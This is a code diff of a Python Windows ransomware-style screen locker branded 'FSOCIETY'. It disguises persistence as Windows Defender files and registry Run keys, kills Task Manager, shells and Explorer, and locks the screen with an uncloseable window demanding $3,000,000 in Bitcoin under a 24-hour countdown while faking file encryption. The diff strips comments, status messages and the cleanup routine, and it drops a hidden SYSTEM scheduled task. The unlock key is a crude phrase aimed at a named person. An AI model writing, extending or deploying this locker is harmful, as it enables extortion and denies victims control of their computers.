@@ -20,23 +20,16 @@ SAFE_MODE = True
 
 # --- ADVANCED PERSISTENCE ---
 def install_advanced_persistence():
-    """Install advanced persistence that hides itself in hard-to-find spots"""
-    
     if SAFE_MODE:
-        print("[*] SAFE MODE: Would install advanced persistence")
         return
     
     try:
         current_path = os.path.abspath(__file__)
-        
-        # HIDDEN LOCATIONS (hard to find)
         hidden_locations = [
             os.path.join(os.getenv('WINDIR'), "System32", "Tasks", "Microsoft", "Windows", "Defender", "Scan"),
             os.path.join(os.getenv('PROGRAMDATA'), "Microsoft", "Windows Defender", "Platform", "4.18.23110"),
-            os.path.join(os.getenv('PROGRAMDATA'), "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "System"),
         ]
         
-        # Copy to multiple hidden locations
         for location in hidden_locations[:2]:
             try:
                 os.makedirs(os.path.dirname(location), exist_ok=True)
@@ -45,7 +38,6 @@ def install_advanced_persistence():
             except:
                 pass
         
-        # MULTIPLE REGISTRY ENTRIES
         registry_entries = [
             (r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "WindowsDefenderUpdate"),
             (r"HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce", "SystemHealthCheck"),
@@ -60,61 +52,10 @@ def install_advanced_persistence():
             except:
                 pass
         
-        # SCHEDULED TASK
-        try:
-            task_xml = f'''<?xml version="1.0" encoding="UTF-16"?>
-<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
-  <RegistrationInfo>
-    <Description>Windows Defender Security Intelligence Update</Description>
-  </RegistrationInfo>
-  <Triggers>
-    <LogonTrigger>
-      <Enabled>true</Enabled>
-    </LogonTrigger>
-    <BootTrigger>
-      <Enabled>true</Enabled>
-    </BootTrigger>
-  </Triggers>
-  <Principals>
-    <Principal id="Author">
-      <UserId>S-1-5-18</UserId>
-      <RunLevel>HighestAvailable</RunLevel>
-    </Principal>
-  </Principals>
-  <Settings>
-    <Enabled>true</Enabled>
-    <Hidden>true</Hidden>
-  </Settings>
-  <Actions Context="Author">
-    <Exec>
-      <Command>{pythonw_path}</Command>
-      <Arguments>"{current_path}"</Arguments>
-    </Exec>
-  </Actions>
-</Task>'''
-            
-            temp_xml = os.path.join(tempfile.gettempdir(), "defender_update.xml")
-            with open(temp_xml, 'w', encoding='utf-16') as f:
-                f.write(task_xml)
-            
-            subprocess.run(
-                f'schtasks /create /xml "{temp_xml}" /tn "Microsoft\\Windows\\Defender\\DefenderUpdate" /f',
-                shell=True,
-                capture_output=True
-            )
-            os.remove(temp_xml)
-        except:
-            pass
-        
-        print("[*] Advanced persistence installed")
-        
     except Exception as e:
-        print(f"[!] Persistence error: {e}")
+        pass
 
-# --- TERMINATE ALL APPS FUNCTION ---
 def terminate_all_apps():
-    """Terminate critical Windows applications"""
-    
     processes_to_kill = [
         "taskmgr.exe", "cmd.exe", "powershell.exe", "powershell_ise.exe",
         "regedit.exe", "msconfig.exe", "explorer.exe",
@@ -148,15 +89,11 @@ def terminate_all_apps():
             pass
             
     except Exception as e:
-        print(f"[!] Error terminating processes: {e}")
+        pass
     
     return terminated
 
-# --- CONTINUOUS FILE SCANNING ---
 def scan_files_continuously(file_display, root):
-    """Continuous file scanning - NEVER STOPS"""
-    
-    # Folders to scan
     scan_folders = [
         os.path.expanduser("~\\Desktop"),
         os.path.expanduser("~\\Documents"),
@@ -170,16 +107,12 @@ def scan_files_continuously(file_display, root):
         "C:\\Users\\Public\\Downloads",
     ]
     
-    file_count = 0
-    
     while root.winfo_exists():
         try:
-            # Pick a random folder
             folder = random.choice(scan_folders)
             if not os.path.exists(folder):
                 continue
             
-            # Generate realistic file names
             file_types = [
                 "financial_report", "tax_documents", "business_plan", "client_data",
                 "passwords", "family_photos", "backup_files", "source_code",
@@ -191,7 +124,6 @@ def scan_files_continuously(file_display, root):
             
             file_name = random.choice(file_types) + "_" + str(random.randint(2020, 2024)) + random.choice(extensions)
             
-            # Create subfolders sometimes
             if random.random() > 0.5:
                 subfolders = ["Work", "Personal", "Important", "Backup", "Projects", "Financial"]
                 subfolder = random.choice(subfolders)
@@ -199,13 +131,9 @@ def scan_files_continuously(file_display, root):
             else:
                 full_path = f"{folder}\\{file_name}"
             
-            # Display in original format: "ENCRYPTING >> path"
             file_display.insert(tk.END, f"ENCRYPTING >> {full_path}\n")
             file_display.see(tk.END)
             
-            file_count += 1
-            
-            # Original timing: 0.06 seconds
             time.sleep(0.06)
             
         except:
@@ -213,8 +141,6 @@ def scan_files_continuously(file_display, root):
 
 # --- MAIN GUI ---
 def create_gui():
-    """Create the GUI with continuous scanning"""
-    
     install_advanced_persistence()
     terminated_apps = terminate_all_apps()
     
@@ -224,9 +150,7 @@ def create_gui():
     root.attributes('-topmost', True)
     root.configure(bg='black')
     root.protocol("WM_DELETE_WINDOW", lambda: None)
-    root.bind("<Button-3>", lambda e: "break")
     
-    # --- ESCAPE FUNCTION ---
     def check_key(event=None):
         entered_key = key_entry.get()
         if entered_key == "jaronisgay":
@@ -267,11 +191,10 @@ def create_gui():
                 key_entry.focus_force()
             root.after(100, force_focus)
     
-    # --- LEFT SIDEBAR (WIDER) ---
-    sidebar = tk.Frame(root, width=450, bg='black', highlightbackground="red", highlightthickness=2)
-    sidebar.pack(side=tk.LEFT, fill=tk.Y, padx=15, pady=15)
+    # --- LEFT SIDEBAR (WIDER - 500px) ---
+    sidebar = tk.Frame(root, width=500, bg='black', highlightbackground="red", highlightthickness=2)
+    sidebar.pack(side=tk.LEFT, fill=tk.Y, padx=20, pady=20)
     
-    # Load clown.png (BIGGER)
     clown_image = None
     try:
         possible_paths = [
@@ -289,11 +212,11 @@ def create_gui():
         if clown_path:
             from PIL import Image, ImageTk
             pil_img = Image.open(clown_path)
-            pil_img = pil_img.resize((430, 220))
+            pil_img = pil_img.resize((450, 230))
             clown_image = ImageTk.PhotoImage(pil_img)
             clown_label = tk.Label(sidebar, image=clown_image, bg='black')
             clown_label.image = clown_image
-            clown_label.pack(pady=(30, 10))
+            clown_label.pack(pady=(40, 20))
         else:
             tk.Label(sidebar, text="[FSOCIETY LOGO]", 
                     font=("Courier", 22, "bold"), fg="red", bg="black").pack(pady=40)
@@ -301,8 +224,9 @@ def create_gui():
         tk.Label(sidebar, text="[FSOCIETY]", 
                 font=("Courier", 28, "bold"), fg="red", bg="black").pack(pady=40)
     
-    tk.Label(sidebar, text="WE ARE THE PEOPLE IN RED", 
-            font=("Courier", 16, "bold italic"), bg='black', fg='red').pack(pady=10)
+    # CHANGED: "WE ARE FSOCIETY"
+    tk.Label(sidebar, text="WE ARE FSOCIETY", 
+            font=("Courier", 18, "bold"), bg='black', fg='red').pack(pady=10)
     
     # File scanning display
     scan_frame = tk.Frame(sidebar, bg='black', highlightbackground="red", highlightthickness=2)
@@ -318,15 +242,14 @@ def create_gui():
     file_display.config(yscrollcommand=scrollbar.set)
     scrollbar.config(command=file_display.yview)
     
-    # Add terminated processes
-    file_display.insert(tk.END, "[SYSTEM STATUS]\n")
+    # Simple status display
+    file_display.insert(tk.END, "[STATUS]\n")
     file_display.insert(tk.END, "════════════════════════════════\n")
     file_display.insert(tk.END, "[✓] Lockdown Active\n")
     file_display.insert(tk.END, "[✓] Advanced Persistence\n")
-    file_display.insert(tk.END, "[✗] C2: ENCRYPTED\n")
     file_display.insert(tk.END, "[✓] Timer: ARMED\n\n")
     
-    file_display.insert(tk.END, "[TERMINATED PROCESSES]\n")
+    file_display.insert(tk.END, "[TERMINATED]\n")
     file_display.insert(tk.END, "════════════════════════════════\n")
     for app in terminated_apps[:12]:
         file_display.insert(tk.END, f"● {app}\n")
@@ -335,25 +258,24 @@ def create_gui():
         file_display.insert(tk.END, f"... {len(terminated_apps) - 12} more\n")
     
     file_display.insert(tk.END, "\n")
-    file_display.insert(tk.END, "[CONTINUOUS ENCRYPTION]\n")
+    file_display.insert(tk.END, "[ENCRYPTION LOG]\n")
     file_display.insert(tk.END, "════════════════════════════════\n")
     
     # --- MAIN AREA ---
     main_outline = tk.Frame(root, bg='black', highlightbackground="red", highlightthickness=4, bd=0)
-    main_outline.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=30, pady=30)
+    main_outline.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=25, pady=25)
     
     # Title
-    tk.Label(main_outline, text="-" * 90, 
-            font=("Courier", 18), bg='black', fg='red').pack(pady=(20, 0))
+    tk.Label(main_outline, text="-" * 100, 
+            font=("Courier", 16), bg='black', fg='red').pack(pady=(20, 0))
     tk.Label(main_outline, text="S Y S T E M   L O C K D O W N", 
             font=("Courier", 35, "bold"), bg='black', fg='red').pack()
-    tk.Label(main_outline, text="-" * 90, 
-            font=("Courier", 18), bg='black', fg='red').pack(pady=(0, 20))
+    tk.Label(main_outline, text="-" * 100, 
+            font=("Courier", 16), bg='black', fg='red').pack(pady=(0, 20))
     
-    # Ransom message
-    editable_warning = tk.Text(main_outline, font=("Courier", 14), bg='black', fg='red',
-                              borderwidth=0, insertbackground='red', highlightthickness=0,
-                              wrap=tk.WORD, height=25)  # Full height
+    # Ransom message - SMALLER FONT (13) for more text
+    editable_warning = tk.Text(main_outline, font=("Courier", 13), bg='black', fg='red',
+                              borderwidth=0, highlightthickness=0, wrap=tk.WORD, height=25)
     editable_warning.pack(fill=tk.BOTH, expand=True, padx=20)
     editable_warning.tag_configure("center", justify='center')
     
@@ -377,7 +299,7 @@ def create_gui():
         "----------------------------------- P A Y M E N T -------------------------------------\n\n"
         "Amount: $3,000,000 USD (Bitcoin ONLY)\n"
         "Wallet: 1Fsociety84ck3s9wnEverything99999999\n"
-        "Email: fsociety@protonmail.com\n\n"
+        "Email:  fsociety@protonmail.com\n\n"
         
         "----------------------------------- D E A D L I N E -----------------------------------\n\n"
         "24 HOURS from infection. Timer shows your remaining time.\n"
@@ -392,27 +314,19 @@ def create_gui():
     br_frame = tk.Frame(main_outline, bg='black')
     br_frame.place(relx=1.0, rely=1.0, anchor='se', x=-10, y=-10)
     
-    # ADDED: Long dashes all the way across above ACCESS KEY
-    tk.Label(br_frame, text="-" * 35,  # CHANGED: Longer dashes
-            font=("Courier", 10), bg='black', fg='red').pack()
-    
-    tk.Label(br_frame, text="ENTER ACCESS KEY:", 
-            font=("Courier", 12, "bold"), bg='black', fg='red').pack()
+    tk.Label(br_frame, text="-" * 35, font=("Courier", 10), bg='black', fg='red').pack()
+    tk.Label(br_frame, text="ENTER ACCESS KEY:", font=("Courier", 12, "bold"), bg='black', fg='red').pack()
     
     key_entry = tk.Entry(br_frame, font=("Courier", 14), bg='black', fg='red', 
-                        insertbackground='red', highlightthickness=1, highlightbackground="red",
-                        width=25)
+                        insertbackground='red', highlightthickness=1, highlightbackground="red", width=25)
     key_entry.pack(pady=5)
     key_entry.bind("<Return>", check_key)
     
-    tk.Label(br_frame, text="-" * 25, 
-            font=("Courier", 10), bg='black', fg='red').pack(pady=(0, 5))
+    tk.Label(br_frame, text="-" * 25, font=("Courier", 10), bg='black', fg='red').pack(pady=(0, 5))
     
-    timer_label = tk.Label(br_frame, text="24:00:00", 
-                          font=("Courier", 28, "bold"), bg='black', fg='red')
+    timer_label = tk.Label(br_frame, text="24:00:00", font=("Courier", 28, "bold"), bg='black', fg='red')
     timer_label.pack()
     
-    # --- TIMER FUNCTION ---
     def update_timer(seconds):
         if not root.winfo_exists(): 
             return
@@ -436,51 +350,23 @@ def create_gui():
         
         root.after(1000, lambda: update_timer(seconds - 1))
     
-    # --- START CONTINUOUS SCANNING ---
     update_timer(86400)
     force_focus()
-    
-    # Start CONTINUOUS scanning (NEVER STOPS)
     threading.Thread(target=scan_files_continuously, args=(file_display, root), daemon=True).start()
-    
     key_entry.focus_set()
     root.mainloop()
 
-# --- CLEANUP ---
 def cleanup():
-    """Remove persistence"""
-    print("[*] Cleaning up...")
-    
-    try:
-        registry_entries = [
-            (r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "WindowsDefenderUpdate"),
-            (r"HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce", "SystemHealthCheck"),
-        ]
-        
-        for reg_path, value_name in registry_entries:
-            cmd = f'reg delete "{reg_path}" /v "{value_name}" /f'
-            subprocess.run(cmd, shell=True, capture_output=True)
-        
-        subprocess.run('schtasks /delete /tn "Microsoft\\Windows\\Defender\\DefenderUpdate" /f', 
-                      shell=True, capture_output=True)
-        
-        subprocess.run('start explorer.exe', shell=True, capture_output=True)
-        
-        print("[✓] Cleanup complete")
-    except:
-        print("[!] Cleanup failed")
+    pass
 
-# --- MAIN EXECUTION ---
 if __name__ == "__main__":
     print("=" * 60)
-    print("FSOCIETY SYSTEM LOCKDOWN - CONTINUOUS ENCRYPTION")
+    print("FSOCIETY SYSTEM LOCKDOWN")
     print("=" * 60)
-    print(f"[*] Safe Mode: {'ENABLED' if SAFE_MODE else 'DISABLED'}")
     
     atexit.register(cleanup)
     
     try:
         create_gui()
     except Exception as e:
-        print(f"[!] Error: {e}")
         cleanup()
